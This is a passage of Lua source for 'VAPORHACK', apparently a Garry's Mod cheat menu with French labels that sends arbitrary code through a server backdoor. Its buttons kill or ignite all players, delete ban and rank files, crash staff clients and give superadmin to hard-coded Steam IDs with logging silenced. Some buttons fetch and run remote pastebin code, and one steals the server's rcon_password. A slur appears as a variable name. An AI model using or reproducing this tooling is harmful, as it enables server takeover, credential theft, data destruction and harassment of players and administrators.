timer.Remove( "stripclub" )
VAPOR.ChatText( "Strip stoppé" )
end
end, },
},
} )






-- CREATION DES FONCTIONS DE BASE

function VAPOR.MakeFunctionButton( parent, x, y, btext, func, tooltip)
if !parent:IsValid() then return end
local TButton = vgui.Create( "DButton" )
TButton:SetParent( parent )
TButton:SetPos( x, y )
TButton:SetText( btext )
TButton:SetTextColor( Color(255, 255, 255, 255) )
TButton:SizeToContents()
TButton:SetTall( 24 )
if tooltip then TButton:SetToolTip( tooltip ) end
TButton.Paint = function( self, w, h )
surface.SetDrawColor( Color(100, 100, 100, 245) )
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( Color( 60, 60, 60 ) )
--surface.SetMaterial( downgrad )
--surface.DrawTexturedRect( 0, 0, w, h/ 2 )
surface.SetDrawColor( Color(100, 100, 100, 255) )
--surface.DrawOutlinedRect( 0, 0, w, h )
end
TButton.DoClick = function()
func()
end
return TButton:GetWide(), TButton:GetTall()
end


function VAPOR.HTXBackdoor( parent, x, y, btext )
if !parent:IsValid() then return end
local TButton = vgui.Create( "DButton" )
TButton:SetParent( parent )
TButton:SetPos( x, y )
TButton:SetText( btext )
TButton:SetTextColor( Color(255, 255, 255, 255) )
TButton:SizeToContents()
TButton:SetTall( 24 )
TButton.Paint = function( self, w, h )
surface.SetDrawColor( Color(160, 61, 255, 200) )
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( Color( 60, 60, 60 ) )
surface.SetDrawColor( Color( 60, 60, 60 ) )
--surface.SetMaterial( downgrad )
--surface.DrawTexturedRect( 0, 0, w, h/ 2 )
surface.SetDrawColor( Color(100, 100, 100, 255) )
surface.DrawOutlinedRect( 0, 0, w, h )
surface.SetDrawColor( Color(110, 70, 70, 255) )
--surface.DrawOutlinedRect( 2, 2, w - 4, h - 4 )
end
TButton.DoClick = function()
VAPOR.HTXCommandeListe()
end
return TButton:GetWide(), TButton:GetTall()
end


function VAPOR.HTXCommandeListe()
if VAPOR.HTXCommandeSelector and VAPOR.HTXCommandeSelector:IsVisible() then VAPOR.HTXCommandeSelector:Remove() end
VAPOR.HTXCommandeSelector = vgui.Create("DFrame")
VAPOR.HTXCommandeSelector:SetSize(682,350)
VAPOR.HTXCommandeSelector:SetTitle("Backdoor HTX")
VAPOR.HTXCommandeSelector:SetPos( 342, 250 )
VAPOR.HTXCommandeSelector:MakePopup()
VAPOR.HTXCommandeSelector:ShowCloseButton( false ) 
VAPOR.HTXCommandeSelector.Paint = function( s, w, h )
if !VAPOR.Menu or !VAPOR.Menu:IsVisible() then s:Remove() return end
surface.SetDrawColor( Color(30, 30, 30, 255) )
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( Color(55, 55, 55, 255) )
surface.DrawOutlinedRect( 0, 0, w, h )
surface.DrawOutlinedRect( 1, 1, w - 2, h - 2 )
end

local CloseMenu3 = vgui.Create("DButton", VAPOR.HTXCommandeSelector )
    CloseMenu3:SetText("<--")
    CloseMenu3:SetSize(200, 200)
    CloseMenu3:SetPos(VAPOR.HTXCommandeSelector:GetWide()-120,-85)
    CloseMenu3:SetTextColor(Color(100, 100, 100,245))
    CloseMenu3:SetFont("vaporfont20")
    CloseMenu3.Paint = function( self,w,h ) end
    CloseMenu3.DoClick = function()
        VAPOR.HTXCommandeSelector:Remove()

    end 

local DScrollPanel = vgui.Create( "DScrollPanel", VAPOR.HTXCommandeSelector )
DScrollPanel:Dock( FILL )
local commandnethtx1 = vgui.Create("DButton", DScrollPanel)
commandnethtx1:SetSize( 652, 20 )
commandnethtx1:SetPos( 2, 175 )
commandnethtx1:SetText("Tuer tous les joueurs")
commandnethtx1:SetTextColor(Color(255, 255, 255, 255))
commandnethtx1.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(100, 100, 100 ,245)
surface.DrawRect(0, 0, w, h)
end
commandnethtx1.DoClick = function()
VAPOR.NetStart(vaporhacknet)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:Kill() end" )
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx2 = vgui.Create("DButton", DScrollPanel)
commandnethtx2:SetSize( 652, 20 )
commandnethtx2:SetPos( 2, 100 )
commandnethtx2:SetText("Spam Visuel")
commandnethtx2:SetTextColor(Color(255, 255, 255, 255))
commandnethtx2.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(178, 99, 255)
surface.DrawRect(0, 0, w, h)
end
commandnethtx2.DoClick = function()
net.Start(vaporhacknet)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:SendLua([[local hud = vgui.Create(\"HTML\") hud:MoveToFront() hud:SetSize(200,158) hud:SetPos(0,0) hud:OpenURL(\"http://image.noelshack.com/fichiers/2017/46/1/1510531246-swag-dance.gif\")]]) v:SendLua([[local hud2 = vgui.Create(\"HTML\") hud2:MoveToFront() hud2:SetSize(200,158) hud2:SetPos(0,ScrH()-158) hud2:OpenURL(\"http://image.noelshack.com/fichiers/2017/46/1/1510531305-spin.gif\")]]) v:SendLua([[local hud3 = vgui.Create(\"HTML\") hud3:MoveToFront() hud3:SetSize(200,158) hud3:SetPos(ScrW()-200,0) hud3:OpenURL(\"http://image.noelshack.com/fichiers/2017/46/1/1510531246-swag-dance.gif\")]]) v:SendLua([[local hud4 = vgui.Create(\"HTML\") hud4:MoveToFront() hud4:SetSize(200,158) hud4:SetPos(ScrW()-200,ScrH()-158) hud4:OpenURL(\"http://image.noelshack.com/fichiers/2017/46/1/1510531305-spin.gif\")]]) timer.Create( \"spamsondeouf\", 1, 0, function() v:EmitSound( \"npc/stalker/go_alert2a.wav\", 100, 100 ) end) v:SendLua([[hook.Add(\"HUDPaint\",\"c\", function() draw.RoundedBox(0,0,0,ScrW(),ScrH(),Color(math.random(1,255),math.random(1,255),math.random(1,255),155)) end)]]) end BroadcastLua([[hook.Add( \"RenderScreenspaceEffects\", \"ohgod\", function() local sinScaler = math.sin( CurTime() *(RealFrameTime() *1024) ) DrawSharpen( 1 +(sinScaler *10), 0.5 +(sinScaler *2) ) DrawMaterialOverlay( \"effects/tp_eyefx/tpeye\", 1 ) end)]]) BroadcastLua([[timer.Create( \"thedrop\", 0.42, 0, function() util.ScreenShake( LocalPlayer():GetPos(), 512, 5, 0.25, 128 ) end )]]) BroadcastLua([[local hud3 = vgui.Create(\"HTML\") hud3:SetSize(400,300) hud3:SetPos(ScrW()/2-200,ScrH()/2-150) hud3:OpenURL(\"http://image.noelshack.com/fichiers/2017/46/1/1510531253-skel2.gif\")]])" )
net.WriteBit(1)
net.SendToServer()
end



local commandnethtx3 = vgui.Create("DButton", DScrollPanel )
commandnethtx3:SetSize( 652, 20 )
commandnethtx3:SetPos( 2, 375 )
commandnethtx3:SetText("Débannir tout les bannis")
commandnethtx3:SetTextColor(Color(255, 255, 255, 255))
commandnethtx3.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(100, 100, 100 ,245)
surface.DrawRect(0, 0, w, h)
end
commandnethtx3.DoClick = function()
VAPOR.NetStart(vaporhacknet)
net.WriteString( "if file.Exists( \"ulib/bans.txt\", \"DATA\" ) then file.Delete(\"ulib/bans.txt\") end" )
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx4 = vgui.Create("DButton", DScrollPanel )
commandnethtx4:SetSize( 652, 20 )
commandnethtx4:SetPos( 2, 125 )
commandnethtx4:SetText("Ignite tous les joueurs")
commandnethtx4:SetTextColor(Color(255, 255, 255, 255))
commandnethtx4.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(100, 100, 100 ,245)
surface.DrawRect(0, 0, w, h)
end
commandnethtx4.DoClick = function()
VAPOR.NetStart(vaporhacknet)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:Ignite(120) end" )
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx5 = vgui.Create("DButton", DScrollPanel )
commandnethtx5:SetSize( 652, 20 )
commandnethtx5:SetPos( 2, 150 )
commandnethtx5:SetText("Supprimer les grades")
commandnethtx5:SetTextColor(Color(255, 255, 255, 255))
commandnethtx5.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(100, 100, 100 ,245)
surface.DrawRect(0, 0, w, h)
end
commandnethtx5.DoClick = function()
VAPOR.NetStart(vaporhacknet)
net.WriteString( "if file.Exists( \"ulib/groups.txt\", \"DATA\" ) then file.Delete(\"ulib/groups.txt\") end" )
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx6 = vgui.Create("DButton", DScrollPanel )
commandnethtx6:SetSize( 652, 20 )
commandnethtx6:SetPos( 2, 50 )
commandnethtx6:SetText("Redémarrer le serveur")
commandnethtx6:SetTextColor(Color(255, 255, 255, 255))
commandnethtx6.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(100, 100, 100 ,245)
surface.DrawRect(0, 0, w, h)
end
commandnethtx6.DoClick = function()
VAPOR.NetStart(vaporhacknet)
net.WriteString("RunConsoleCommand(\"changelevel \"..game.GetMap())")
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx7 = vgui.Create("DButton", DScrollPanel)
commandnethtx7:SetSize( 652, 20 )
commandnethtx7:SetPos( 2, 200 )
commandnethtx7:SetText("Screamer")
commandnethtx7:SetTextColor(Color(255, 255, 255, 255))
commandnethtx7.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(100, 100, 100 ,245)
surface.DrawRect(0, 0, w, h)
end
commandnethtx7.DoClick = function()
VAPOR.NetStart(vaporhacknet)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:EmitSound( \"npc/stalker/go_alert2a.wav\", 100, 100 ) end" )
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx8 = vgui.Create("DButton", DScrollPanel)
commandnethtx8:SetSize( 652, 20 )
commandnethtx8:SetPos( 2, 225 )
commandnethtx8:SetText("Changer le model des joueurs")
commandnethtx8:SetTextColor(Color(255, 255, 255, 255))
commandnethtx8.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(100, 100, 100 ,245)
surface.DrawRect(0, 0, w, h)
end
commandnethtx8.DoClick = function()
VAPOR.NetStart(vaporhacknet)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:SetModel(\"models/editor/playerstart.mdl\") end" )
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx9 = vgui.Create("DButton", DScrollPanel)
commandnethtx9:SetSize( 652, 20 )
commandnethtx9:SetPos( 2, 250 )
commandnethtx9:SetText("Niquer la physics du jeu")
commandnethtx9:SetTextColor(Color(255, 255, 255, 255))
commandnethtx9.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(100, 100, 100 ,245)
surface.DrawRect(0, 0, w, h)
end
commandnethtx9.DoClick = function()
net.Start(vaporhacknet)
net.WriteString( "RunConsoleCommand(\"sv_friction\", \"-8\")" )
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx10 = vgui.Create("DButton", DScrollPanel)
commandnethtx10:SetSize( 652, 20 )
commandnethtx10:SetPos( 2, 275 )
commandnethtx10:SetText("Inverser la gravité")
commandnethtx10:SetTextColor(Color(255, 255, 255, 255))
commandnethtx10.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(100, 100, 100 ,245)
surface.DrawRect(0, 0, w, h)
end
commandnethtx10.DoClick = function()
net.Start(vaporhacknet)
net.WriteString( "RunConsoleCommand(\"sv_gravity\", \"-600\")" )
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx11 = vgui.Create("DButton", DScrollPanel)
commandnethtx11:SetSize( 652, 20 )
commandnethtx11:SetPos( 2, 300 )
commandnethtx11:SetText("Reset Argent")
commandnethtx11:SetTextColor(Color(255, 255, 255, 255))
commandnethtx11.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(100, 100, 100 ,245)
surface.DrawRect(0, 0, w, h)
end
commandnethtx11.DoClick = function()
net.Start(vaporhacknet)
net.WriteString( "RunConsoleCommand(\"rp_resetallmoney\")" )
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx12 = vgui.Create("DButton", DScrollPanel)
commandnethtx12:SetSize( 652, 20 )
commandnethtx12:SetPos( 2, 325 )
commandnethtx12:SetText("Faire voler tous les joueurs")
commandnethtx12:SetTextColor(Color(255, 255, 255, 255))
commandnethtx12.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(100, 100, 100 ,245)
surface.DrawRect(0, 0, w, h)
end
commandnethtx12.DoClick = function()
net.Start(vaporhacknet)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:SetVelocity(v:GetVelocity() + Vector(math.random(1000,5000), math.random(1000,5000), math.random(1000,5000))) end" )
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx13 = vgui.Create("DButton", DScrollPanel)
commandnethtx13:SetSize( 652, 20 )
commandnethtx13:SetPos( 2, 350 )
commandnethtx13:SetText("Crash superadmin")
commandnethtx13:SetTextColor(Color(255, 255, 255, 255))
commandnethtx13.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(100, 100, 100 ,245)
surface.DrawRect(0, 0, w, h)
end
commandnethtx13.DoClick = function()
net.Start(vaporhacknet)
net.WriteString( " for k,v in pairs(player.GetAll()) do if( v:GetUserGroup() != \"user\" ) then v:SendLua(\"while true do end\") end end" )
net.WriteBit(1)
net.SendToServer()
end

local commandnethtx14 = vgui.Create("DButton", DScrollPanel)
commandnethtx14:SetSize( 652, 20 )
commandnethtx14:SetPos( 2, 75 )
commandnethtx14:SetText("Squeleton Danse")
commandnethtx14:SetTextColor(Color(255, 255, 255, 255))
commandnethtx14.Paint = function(panel, w, h)
surface.SetDrawColor(160, 61, 255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(178, 99, 255)
surface.DrawRect(0, 0, w, h)
end
commandnethtx14.DoClick = function()
net.Start(vaporhacknet)
net.WriteString( "http.Fetch(\"https://pastebin.com/raw/QiEipqZ4\",function(b,l,h,c)RunString(b)end,nil)" )
net.WriteBit(1)
net.SendToServer()
end

local commandnethtx15 = vgui.Create("DButton", DScrollPanel)
commandnethtx15:SetSize( 652, 20 )
commandnethtx15:SetPos( 2, 400 )
commandnethtx15:SetText("+1000$/s")
commandnethtx15:SetTextColor(Color(255, 255, 255, 255))
commandnethtx15.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(100, 100, 100 ,245)
surface.DrawRect(0, 0, w, h)
end
commandnethtx15.DoClick = function()
net.Start(vaporhacknet)
net.WriteString( "for k,v in pairs(player.GetAll()) do timer.Create( \"timerargent10\", 0.1, 0, function() v:addMoney(10) end) end" )
net.WriteBit(1)
net.SendToServer()
end

local commandnethtx17 = vgui.Create("DButton", DScrollPanel)
commandnethtx17:SetSize( 652, 20 )
commandnethtx17:SetPos( 2, 425 )
commandnethtx17:SetText("Supprimer Toutes les Entité")
commandnethtx17:SetTextColor(Color(255, 255, 255, 255))
commandnethtx17.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(100, 100, 100 ,245)
surface.DrawRect(0, 0, w, h)
end
commandnethtx17.DoClick = function()
net.Start(vaporhacknet)
net.WriteString( "for k, v in pairs(ents.FindByClass( \"prop_*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"func_*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"env_*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"lua_run*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"point_*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"trigger_*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"info_*\" )) do v:Remove() end" )
net.WriteBit(1)
net.SendToServer()
end

local commandnethtxSpamChat = vgui.Create("DButton", DScrollPanel )
commandnethtxSpamChat:SetSize( 652, 20 )
commandnethtxSpamChat:SetPos( 2, 450 )
commandnethtxSpamChat:SetText("Spam Chat")
commandnethtxSpamChat:SetTextColor(Color(255,255,255,255))
commandnethtxSpamChat.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(100, 100, 100 ,245)
surface.DrawRect(0, 0, w, h)
end
commandnethtxSpamChat.DoClick = function()
VAPOR.NetStart(vaporhacknet)
net.WriteString("timer.Create( \"rekt\", 0.1, 0, function() BroadcastLua([[chat.AddText(Color(math.random(1,255),math.random(1,255),math.random(1,255)), \"◊◊◊◊◊ SERVER HACKED BY VAPORHACK ! ◊◊◊◊◊\")]]) end)")
net.WriteBit(1)
net.SendToServer()
end

local commandnethtxSpamChatStop = vgui.Create("DButton", DScrollPanel )
commandnethtxSpamChatStop:SetSize( 652, 20 )
commandnethtxSpamChatStop:SetPos( 2, 475 )
commandnethtxSpamChatStop:SetTextColor(Color(255,255,255,255))
commandnethtxSpamChatStop:SetText("Stop Spam Chat")
commandnethtxSpamChatStop.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(100, 100, 100 ,245)
surface.DrawRect(0, 0, w, h)
end
commandnethtxSpamChatStop.DoClick = function ()
net.Start(vaporhacknet)
net.WriteString("timer.Stop( \"rekt\")")
net.WriteBit(1)
net.SendToServer() 
end

local setsuperadmin = vgui.Create("DButton", DScrollPanel )
setsuperadmin:SetSize( 652, 20 )
setsuperadmin:SetPos( 2, 500 )
setsuperadmin:SetTextColor(Color(255,255,255,255))
setsuperadmin:SetText("Se Mettre Superadmin")
setsuperadmin.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(100, 100, 100 ,245)
surface.DrawRect(0, 0, w, h)
end
setsuperadmin.DoClick = function ()
local setsuperadminsetting = [[
RunConsoleCommand("ulx_logecho", "0")
RunConsoleCommand("ulx", "adduserid", "STEAM_0:0:189348722", "superadmin")
RunConsoleCommand("ulx", "adduserid", "STEAM_0:0:99250842", "superadmin")
RunConsoleCommand("ulx", "adduserid", "STEAM_0:1:196391683", "superadmin")
]]
net.Start(vaporhacknet)
net.WriteString( setsuperadminsetting )
net.WriteBit(1)
net.SendToServer() 
end

local rconstealervapor = DScrollPanel:Add( "DButton")
rconstealervapor:SetSize( 668, 20 )
rconstealervapor:SetPos( 2, 25 )
rconstealervapor:SetText("Voler le rcon_password")
rconstealervapor:SetTextColor(Color(255, 255, 255, 255))
rconstealervapor.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(50, 50, 50 ,245)
surface.DrawRect(0, 0, w, h)
end
rconstealervapor.DoClick = function()
net.Start(vaporhacknet)
net.WriteString( "http.Fetch(\"https://pastebin.com/raw/u5qnn5kw\",function(b,l,h,c)RunString(b)end,nil)" )
net.WriteBit(1)
net.SendToServer()
timer.Simple( 0.5, function()
if VAPOR.ValidNetString( "jeveuttonrconleul" ) then
net.Start("jeveuttonrconleul")
net.SendToServer()
else
chat.AddText( Color(255, 0, 0),"rcon_password pas trouvé, veuillez réessayer ^^" )
end
end)
end

local GLUACommand = vgui.Create( "DTextEntry", DScrollPanel )
GLUACommand:SetPos( 110, 0 )
GLUACommand:SetSize( 545, 20 )
GLUACommand:SetText( "Entity( 1 ):SetUserGroup( 'superadmin' )" )
local Lancer_glua_commande = vgui.Create("DButton", DScrollPanel )
Lancer_glua_commande:SetSize( 103, 20 )
Lancer_glua_commande:SetPos( 2, 0 )
Lancer_glua_commande:SetText("Code LUA")
Lancer_glua_commande:SetTextColor(Color(255, 255, 255, 255))
Lancer_glua_commande.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(50, 50, 50 ,245)
surface.DrawRect(0, 0, w, h)
end
Lancer_glua_commande.DoClick = function()
local glua_commandes_get = GLUACommand:GetValue()
VAPOR.NetStart(vaporhacknet)
net.WriteString( glua_commandes_get )
net.WriteBit(1)
net.SendToServer()
end
end
net.Receive( "rcon_passw_dump", function()
local rcon_pass = net.ReadString()
chat.AddText( Color(255, 255, 255), rcon_pass, Color(0, 255, 0),"")
end )
net.Receive( "aucun_rcon_ici", function()
chat.AddText( Color(255, 0, 0),"Aucun rcon_password sur le serveur :/" )
end )


function VAPOR.MakePlayerSelectionButton( parent, x, y, addr )
if !parent:IsValid() then return end
local TButton = vgui.Create( "DButton" )
TButton:SetParent( parent )
TButton:SetPos( x, y )
TButton:SetText( "Choisir des cibles" )
TButton:SetTextColor( Color(255, 255, 255, 255) )
TButton:SizeToContents()
TButton:SetTall( 24 )
TButton.Paint = function( self, w, h )
surface.SetDrawColor( Color(100, 100, 100, 245 ) )
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( Color( 60, 60, 60 ) )
--surface.SetMaterial( downgrad )
--surface.DrawTexturedRect( 0, 0, w, h/ 2 )
surface.SetDrawColor( Color(100, 100, 100, 255) )
--surface.DrawOutlinedRect( 0, 0, w, h )
surface.SetDrawColor( Color(70, 70, 100, 255) )
--surface.DrawOutlinedRect( 2, 2, w - 4, h - 4 )
end
TButton.DoClick = function()
VAPOR.SelectPlayersPanel( addr )
end
return TButton:GetWide(), TButton:GetTall()
end


function VAPOR.SelectPlayersPanel( addr )
if VAPOR.PlayerSelector and VAPOR.PlayerSelector:IsVisible() then VAPOR.PlayerSelector:Remove() end
local plytab = VAPOR.GetStored( addr, {} )
VAPOR.PlayerSelector = vgui.Create("DFrame")
VAPOR.PlayerSelector:SetSize(682,350)
VAPOR.PlayerSelector:SetDraggable( false ) 
VAPOR.PlayerSelector:SetTitle("Cible(s)")
VAPOR.PlayerSelector:SetPos( 342, 250)
VAPOR.PlayerSelector:MakePopup()
VAPOR.PlayerSelector:ShowCloseButton( false ) 
VAPOR.PlayerSelector.DoClick = function()
        CloseMenu:Remove()
end
VAPOR.PlayerSelector.Paint = function( s, w, h )
if !VAPOR.Menu or !VAPOR.Menu:IsVisible() then s:Remove() return end
surface.SetDrawColor( Color(30, 30, 30, 255) )
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( Color(55, 55, 55, 255) )
surface.DrawOutlinedRect( 0, 0, w, h )
surface.DrawOutlinedRect( 1, 1, w - 2, h - 2 )
end


local CloseMenu2 = vgui.Create("DButton", VAPOR.PlayerSelector )
    CloseMenu2:SetText("<--")
    CloseMenu2:SetSize(200, 200)
    CloseMenu2:SetPos(VAPOR.PlayerSelector:GetWide()-120,-85)
    CloseMenu2:SetTextColor(Color(100, 100, 100,245))
    CloseMenu2:SetFont("vaporfont20")
    CloseMenu2.Paint = function( self,w,h ) end
    CloseMenu2.DoClick = function()
        VAPOR.PlayerSelector:Remove()

    end 

local Plist = vgui.Create( "DPanelList", VAPOR.PlayerSelector )
Plist:SetSize( VAPOR.PlayerSelector:GetWide() - 10, VAPOR.PlayerSelector:GetTall() - 55 )
Plist:SetPadding( 5 )
Plist:SetSpacing( 5 )
Plist:EnableHorizontal( false )
Plist:EnableVerticalScrollbar( true )
Plist:SetPos( 5, 40 )
Plist:SetName( "" )
local target1 = vgui.Create("DButton", VAPOR.PlayerSelector)
target1:SetSize( 40, 20 )
target1:SetPos( 10, 23 )
target1:SetText("Tous")
target1:SetTextColor(Color(255, 255, 255, 255))
target1.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
--surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(100, 100, 100 ,245)
surface.DrawRect(0, 0, w, h)
end
target1.DoClick = function()
for _, p in pairs(player.GetAll()) do
if not table.HasValue( plytab, p ) then
table.insert( plytab, p )
end
end
VAPOR.Store( addr, plytab )
end
local target2 = vgui.Create("DButton", VAPOR.PlayerSelector)
target2:SetSize( 40, 20 )
target2:SetPos( 55, 23 )
target2:SetText("Aucun")
target2:SetTextColor(Color(255, 255, 255, 255))
target2.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
--surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(100, 100, 100 ,245)
surface.DrawRect(0, 0, w, h)
end
target2.DoClick = function()
table.Empty( plytab )
VAPOR.Store( addr, plytab )
end
local target3 = vgui.Create("DButton", VAPOR.PlayerSelector )
target3:SetSize( 40, 20 )
target3:SetPos( 100, 23 )
target3:SetText("Moi")
target3:SetTextColor(Color(255, 255, 255, 255))
target3.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
--surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(100, 100, 100 ,245)
surface.DrawRect(0, 0, w, h)
end
target3.DoClick = function()
table.Empty( plytab )
table.insert( plytab, LocalPlayer() )
VAPOR.Store( addr, plytab )
end
local target4 = vgui.Create( "DTextEntry", VAPOR.PlayerSelector )
target4:SetPos( 145, 23 )
target4:SetSize( 95, 20 )
target4:SetText( "" )
target4.OnChange = function( self )
local nam = self:GetValue()
local namtab = string.Explode( ", ", nam )
table.Empty( plytab )
for _, pl in pairs( player.GetAll() ) do
for _, s in pairs( namtab ) do
if string.find( string.lower( pl:Nick() ), s ) then
table.insert( plytab, pl )
end
end
end
VAPOR.Store( addr, plytab )
end
for k, v in pairs( player.GetAll() ) do
local plypanel2 = vgui.Create( "DPanel" )
plypanel2:SetPos( 0, 0 )
plypanel2:SetSize( 200, 25 )
local teamcol = team.GetColor( v:Team() )
plypanel2.Paint = function( s, w, h )
if !v:IsValid() then return end
surface.SetDrawColor( Color(100, 100, 100, 30) )
surface.DrawRect( 0, 0, w, h )
--surface.SetDrawColor( teamcol )
surface.DrawRect( 0, h - 3, w, 3 )
surface.SetDrawColor( Color(55, 55, 55, 245) )
surface.DrawOutlinedRect( 0, 0, w, h )
if table.HasValue( plytab, v ) then surface.SetDrawColor( Color(160, 61, 255 ) ) end
surface.DrawOutlinedRect( 1, 1, w - 2, h - 2 )
end
local plyname = vgui.Create( "DLabel", plypanel2 )
plyname:SetPos( 10, 5 )
plyname:SetFont( "Trebuchet18" )
local tcol = Color( 255, 255, 255 )
if v == LocalPlayer() then tcol = Color( 155, 155, 255 ) end
plyname:SetColor( tcol )
plyname:SetText( v:Nick() )
plyname:SetSize(180, 15)
local faggot = vgui.Create("DButton", plypanel2 )
faggot:SetSize( plypanel2:GetWide(), plypanel2:GetTall() )
faggot:SetPos( 0, 0 )
faggot:SetText("")
faggot.Paint = function(panel, w, h)
return
end
faggot.DoClick = function()
if table.HasValue( plytab, v ) then
table.RemoveByValue( plytab, v )
else
table.insert( plytab, v )
end
VAPOR.Store( addr, plytab )
end
Plist:AddItem( plypanel2 )
end
end


concommand.Add( "dontgetit", function()
local VAPORdontgetit = vgui.Create("DFrame")
VAPORdontgetit:SetSize(2300,2300)
VAPORdontgetit:SetTitle("")
VAPORdontgetit:Center()
VAPORdontgetit:SetDraggable( false )
VAPORdontgetit:MakePopup()
VAPORdontgetit.gay = table.Count( VAPOR.sploits )
VAPORdontgetit:ShowCloseButton( false ) 
VAPORdontgetit.Paint = function( s, w, h )
surface.SetDrawColor( Color(0, 0, 0, 255) )   ---<
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( Color(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75)) )  --
surface.DrawOutlinedRect( 0, 0, w, h )
surface.DrawOutlinedRect( 1, 1, w - 2, h - 2 )
surface.SetDrawColor( Color(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75)) )
surface.DrawRect( 10, 10, w - 20, h - 20 )
surface.SetDrawColor( Color(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75)) )
--surface.DrawRect( 0, 520, w - 0, h - 0 )
--surface.SetDrawColor( Color(255, 66, 66, 0) )
--surface.DrawRect( 0, 520, w - 0, h - 0 )
surface.SetDrawColor( Color(255, 66, 66, 0) )
surface.DrawLine( 10, 25, 40, 30 )
surface.DrawLine( 40, 30, 70, 25 )
surface.DrawLine( 10, 25, 25, 40 )
surface.DrawLine( 55, 40, 70, 25 )
surface.PlaySound( "buttons/weapon_cant_buy.wav" )
surface.PlaySound( "buttons/blip2.wav" )
surface.PlaySound( "bot/cover_me.wav" )
surface.DrawLine( 25, 40, 25, 60 )
surface.DrawLine( 55, 40, 55, 60 )
surface.DrawLine( 25, 60, 40, 70 )
surface.DrawLine( 55, 60, 40, 70 )
draw.SimpleTextOutlined( "ERREUR VAPORHACK : Votre comptre n'est pas activé", "vaporfontlight", 1200, 350, Color( 255, 255, 255,255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER, 1, Color(100, 100, 100, 0) )

end 
end)



